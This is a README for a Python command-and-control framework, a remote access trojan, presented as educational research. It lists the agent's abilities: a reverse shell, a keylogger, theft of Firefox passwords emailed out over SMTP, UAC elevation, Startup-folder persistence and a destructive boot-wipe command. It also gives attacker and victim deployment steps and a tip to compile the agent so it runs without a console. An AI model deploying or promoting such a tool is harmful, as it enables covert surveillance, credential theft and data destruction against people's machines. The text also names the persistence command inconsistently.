# 🛠️ Python-based C2 Framework for RAT Research

This repository contains a **Command & Control (C2) Framework** designed for educational research into **Remote Administration Tools (RAT)**. The project demonstrates how modern backdoors establish persistence, exfiltrate data via side-channels (SMTP), and execute remote instructions in controlled environments.

Developed as part of a cybersecurity research lab to understand offensive techniques and develop better defensive countermeasures.

---

## 🏗️ System Architecture

The framework consists of two main components communicating over a TCP reverse connection:

- **C2 Server (`c2_server.py`):** Acts as the listener, managing incoming connections and providing an interactive shell to the operator.
    
- **C2 Agent (`c2_agent.py`):** The client-side component (payload) that executes on the victim machine, providing system access and exfiltration capabilities.
    

---

## 🚀 Key Features

- **📡 Reverse TCP Shell:** Bypasses many firewalls by initiating the connection from the victim to the attacker.
    
- **📧 Out-of-Band Exfiltration:** Uses **SMTP_SSL** to exfiltrate logs (Keylogger) and sensitive data (Firefox passwords) directly to the attacker's email, reducing noise on the main C2 channel.
    
- **⌨️ Threaded Keylogger:** Captures real-time keystrokes and sends reports every 30 seconds.
    
- **🦊 Firefox Credential Recovery:** Automatically locates Firefox profiles and attempts to decrypt stored passwords using specialized binary tools.
    
- **🛡️ Privilege Escalation:** Includes a self-relaunching mechanism to request **Administrator** privileges via UAC.
    
- **📌 Persistence:** Specialized `!consistency` command to install the agent in the Windows Startup directory.

---

## 📦 Installation & Setup

1. **Clone the repository:**
    
    ```Bash
    git clone https://github.com/RandyNin/c2-backdoor.git
    cd c2-backdoor
    ```
    
1. **Install dependencies:**
    
    ```Bash
    pip install -r requirements.txt
    ```
    
2. **Configure credentials:**
    
    Update the `EMAILADDR` and `PASSKEY` variables in both files with your Gmail App Password.
    

---

## ⚡ Execution

### 1. Start the C2 Server (Attacker)

``` Bash
python c2_server.py
```

### 2. Deploy the Agent (Victim)

```Bash
python c2_agent.py
```

> **Pro-Tip:** For professional testing, you can compile the agent into a standalone executable to avoid Python dependencies:
> 
> ```Bash
>  pyinstaller --onefile --noconsole c2_agent.py 
> ```

---

## 📚 Commands Overview

|**Command**|**Description**|
|---|---|
|`!help`|Displays the available command panel.|
|`!get-users`|Lists valid system users via `net user`.|
|`!reboot`| Reboot the system.|
|`!get-firefox`|Automated Firefox password extraction and email exfiltration.|
|`!keylogg-start`|Initializes the background keylogging thread.|
|`!persistence`|Installs the agent into the Startup folder for persistence.|
|`!msg-TEXT`|Displays a custom message box on the victim's screen.|
|`!kill-system`|**DANGER:** Critical file deletion and boot config wipe (Admin only).|

---

## ⚠️ Disclaimer

**This software is for educational and research purposes only.**

The unauthorized use of this tool against systems you do not have explicit permission to test is illegal. The developer (**Randy Nin**) is not responsible for any misuse or damage caused by this framework. Always practice ethical hacking in authorized lab environments.

